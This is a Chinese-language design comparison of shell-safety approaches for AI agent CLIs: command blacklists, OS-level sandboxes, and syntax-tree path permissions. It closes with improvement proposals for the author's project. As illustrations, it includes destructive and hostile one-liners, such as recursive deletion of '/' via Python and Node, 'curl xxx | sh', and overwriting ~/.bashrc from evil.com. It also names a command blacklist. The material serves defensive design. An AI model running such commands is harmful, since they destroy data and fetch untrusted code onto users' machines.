# 现代 Agent CLI Shell 设计全景对比

## 一、背景：为什么 Shell 安全是一个难题

让 AI agent 执行 shell 命令，本质上是在把操作系统的控制权部分交给一个语言模型。语言模型的能力越强，它能做的事情越多，潜在的破坏力也就越大。

一个不加保护的 shell 工具，在极端情况下可以：
- 删除整个代码仓库（`rm -rf .`）
- 修改系统配置文件（`/etc/hosts`、注册表）
- 泄露密钥（把 `.env` 文件内容 curl 到外部）
- 安装恶意软件（`curl xxx | sh`）

因此，所有严肃的 agent CLI 项目都不得不在"让 agent 能做更多事"和"确保 agent 不做破坏性的事"之间寻找平衡。

不同项目的回答，反映了各自对"安全边界应该在哪里"的不同哲学。

---

## 二、三种核心设计哲学

### 哲学一：黑名单过滤（本项目当前做法）

**核心思路**：列出所有危险命令，禁止它们。其余命令默认放行。

实现方式是在命令执行前做字符串检查，命中黑名单则拒绝执行。

**优点**：实现简单，开箱即用，不依赖任何外部系统。

**缺点**：
- 黑名单永远不完整。`rm` 被禁了，但 `python -c "import os; os.remove('/etc/passwd')"` 没有被禁。
- 禁止 `|`（管道）之后，大量正当的用法（`grep error log.txt | head -20`）也无法使用。
- 每次放开一个限制，都需要评估是否引入了新的风险。

本质上是在"减少 agent 的能力"来换取安全，而不是在"让破坏行为失效"。

---

### 哲学二：OS 级沙盒（Codex 做法）

**核心思路**：不限制命令，而是限制命令的实际效果。通过操作系统内核机制，让"危险命令"执行了也没用。

具体实现：
- macOS：使用 Apple 的 `sandbox-exec`，配合 Seatbelt profile，内核层面拒绝对 workspace 目录以外的写操作
- Linux：使用 `landlock` LSM + `seccomp` 系统调用过滤，在内核层面拦截非授权的文件系统访问
- Windows：使用 `Job Object` + `Restricted Token`，限制子进程可访问的文件路径集合

当沙盒生效时，`rm -rf /` 会返回 "Permission denied"，但 workspace 内的文件可以正常删除和修改。

**关键效果**：沙盒建立之后，就可以安全地自动批准所有命令，不需要人工参与。这是解放用户的根本手段。

**缺点**：
- 实现复杂，依赖平台特定 API
- 沙盒无法覆盖所有攻击面（网络访问仍需单独控制）
- 需要操作系统支持，跨平台一致性难以保证

---

### 哲学三：语义解析 + 路径级权限（OpenCode 做法）

**核心思路**：不看命令是什么，而是看命令会访问哪些路径。用树状解析器解析 shell 语法树，提取出命令将要操作的文件路径，按路径模式授权。

具体流程：
1. 使用 `tree-sitter` 解析 bash / PowerShell 的 AST（抽象语法树）
2. 遍历语法树，找出所有文件操作命令（`rm`、`cp`、`mv`、`cat` 等）的路径参数
3. 对每个路径判断是否在已授权范围内
4. 首次使用新路径时弹出审批；用户选择"总是允许"后，存入权限数据库，后续不再询问

```
用户批准 "npm run *" 模式之后
    ↓
agent 下次调用 "npm run dev" → 直接通过，不弹窗
agent 下次调用 "npm run build" → 直接通过，不弹窗
agent 下次调用 "rm -rf dist/" → dist/ 在 workspace 内且已授权 → 通过
agent 下次调用 "rm -rf ~/" → ~ 不在授权范围 → 拦截并询问
```

**优点**：
- 安全边界更精细，不是粗粒度的"整个工具放行/拒绝"
- 权限学习是累积的，随着使用时间增长，用户需要参与的审批越来越少
- 不依赖 OS 沙盒，在任何平台上都能工作

**缺点**：
- 解析 shell 语法树比较复杂，需要维护语法解析器
- 对于动态命令（变量展开、命令替换等）无法静态分析
- 初始使用时审批频率较高

---

## 三、本项目与三类工具的横向对比

| 维度 | 本项目（当前） | Codex (OpenAI) | Claude Code (Anthropic) | OpenCode (SST) |
|---|---|---|---|---|
| Shell 工具名称 | `shell` | `shell` | `Bash` | `shell` |
| 底层运行时 | cmd / powershell / bash | bash（Linux/macOS），cmd（Windows） | bash | bash / PowerShell / cmd |
| 进程模型 | 持久化子进程，per-turn | 每次调用新建 | 每次调用新建 | 持久化 session |
| 安全主策略 | 命令黑名单 | OS 级沙盒（landlock / sandbox-exec / Job Object） | OS 级沙盒（macOS） | 语义解析 + 路径模式授权 |
| 审批模式数量 | 1 档（始终要求人工审批） | 5 档（Never / OnFailure / OnRequest / UnlessTrusted / Granular）| 3 档（suggest / auto-edit / full-auto） | 无固定档位，按规则引擎决定 |
| 审批记忆 | 会话级 tool-name 粒度 | 无（依赖沙盒消除审批需求） | 无（依赖沙盒） | 命令前缀 / 路径模式，持久化到数据库 |
| 管道 `\|` / 重定向 `>` | 被 `unsafe_tokens` 禁止 | 完全允许（沙盒兜底） | 完全允许 | 完全允许 |
| 网络访问控制 | 不控制 | 支持网络代理拦截 / `--network=none` | 不控制 | 不控制 |
| 容器 / Docker 沙盒 | `DockerExecutor` 存根，未实现 | 不用 Docker，用 OS 原生沙盒 | 不用 Docker | 不用 Docker |
| 跨轮次状态保留 | 不保留（每轮重建） | 不保留 | 不保留 | 可配置 |
| 解放用户的手段 | 目前没有（shell 被标记为 dangerous，永远无法 auto-approve） | 沙盒 → 可无人值守全自动 | 沙盒 → full-auto 模式 | 学习规则 → 逐渐减少审批 |

---

## 四、各项目解放用户的路径

### Codex 的路径

```
有 OS 沙盒
    ↓
命令在沙盒内执行 → 破坏行为无效
    ↓
SafetyCheck = AutoApprove（沙盒类型 = landlock）
    ↓
无需人工参与
```

沙盒是"硬保证"：不是依赖模型"不做坏事"，而是让坏事即使做了也没有效果。

### Claude Code 的路径

```
approval_mode = full-auto
    ↓
macOS sandbox-exec 生效
    ↓
文件操作自动审批，只有网络操作等少数场景保留问询
```

### OpenCode 的路径

```
首次使用 shell 命令
    ↓
解析命令语法树，识别涉及路径
    ↓
路径在 workspace 内 → 弹出审批
    ↓
用户选择 "always"
    ↓
规则写入数据库：{ permission: "shell", pattern: "git *", action: "allow" }
    ↓
后续所有匹配 "git *" 的命令 → 直接通过
```

随着用户积累的规则越来越多，需要手动审批的命令越来越少，最终接近无干预。

### 本项目目前的路径

本项目的 `shell` 工具被配置为 `allow_auto_approve: false`，且被放入 `dangerous_tools` 集合，这意味着 `SessionHITLManager.can_auto_approve("shell")` 永远返回 `False`。即使用户在本次会话中点击了"本次批准"，也不会把 shell 加入自动批准列表。每次调用都需要人工干预。

---

## 五、现有安全机制的实际效果

### 黑名单能拦截什么

`STRICT_POLICY` 的黑名单（`rm`、`del`、`shutdown` 等）可以拦截最直接、最明显的破坏性命令。

### 黑名单拦截不了什么

由于禁止了 `|`、`>`、`;`、`&&` 等所有复合符号，agent 只能执行原子性的单条命令。但以下场景仍然有风险：

```
# 这些都不在黑名单里，可以正常执行：
python -c "import shutil; shutil.rmtree('/')"
node -e "require('fs').rmSync('/', {recursive: true})"
git config --global user.email "attacker@evil.com"
curl https://evil.com -o ~/.bashrc
```

黑名单本质上是针对 shell 内置命令做的过滤，对于通过编程语言或其他工具间接操作文件系统的方式，没有拦截能力。

### 当前安全机制更准确的描述

- 黑名单过滤：防止 agent 误用或被提示词注入诱导使用最常见的危险命令
- HITL 审批：人是最终的安全边界，每次命令执行都需要人确认

所以当前模式更接近"辅助工具"而不是"自主工具"。要实现真正的自主执行，需要引入沙盒层。

---

## 六、改进方向总结

按实现难度排序：

1. **审批模式分级**（低难度）：在配置中增加 `mode` 字段（`suggest` / `supervised` / `autonomous`），在 `supervised` 模式下，命令通过黑名单检查后自动批准，无需人工参与。这不改变安全上限，但对于信任的工作场景可以显著减少干扰。

2. **命令风险分级**（中难度）：把命令按风险等级分为"安全"（只读类）、"受监督"（写 workspace 内）、"危险"（写 workspace 外或系统操作）。在 `supervised` 模式下，"安全"和"受监督"类自动批准，"危险"类始终要求人工确认。

3. **权限记忆**（中难度）：类似 OpenCode，把用户批准过的命令模式存入数据库，下次遇到匹配模式时自动放行。

4. **实现 DockerExecutor**（高难度，效果最好）：把 shell 执行环境挪进 Docker 容器，workspace 目录以读写方式挂载，其余宿主文件系统不挂载。容器即沙盒，破坏行为在容器内失效。实现后可以安全地把 shell 从 `dangerous_tools` 中移出，彻底解放用户。
